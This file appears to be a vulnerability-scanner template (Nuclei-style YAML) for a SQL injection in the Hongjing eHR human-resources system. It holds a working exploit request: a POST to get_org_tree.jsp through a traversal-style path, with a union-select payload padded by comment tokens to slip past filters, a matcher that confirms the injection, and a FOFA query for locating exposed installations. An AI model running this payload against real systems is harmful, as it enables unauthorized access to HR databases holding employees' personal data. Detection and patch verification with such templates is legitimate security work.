id: poc-yaml-hongjing-ehr-zp-options-sqli
info:
  name: 宏景eHR zp_options SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    fingerprint: 宏景eHR
    fofa-query: app="HJSOFT-HCM"

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - method: POST
    path:
      - "/templates/attestation/../../hire/zp_options/get_org_tree.jsp"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      params=1%3c1/***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***/union/***//***/select/***//***/1,2,sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}')),4--+
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "0x{{t2}}"
          - "</TreeNode>"
      - type: word
        part: header
        words:
          - "text/xml"
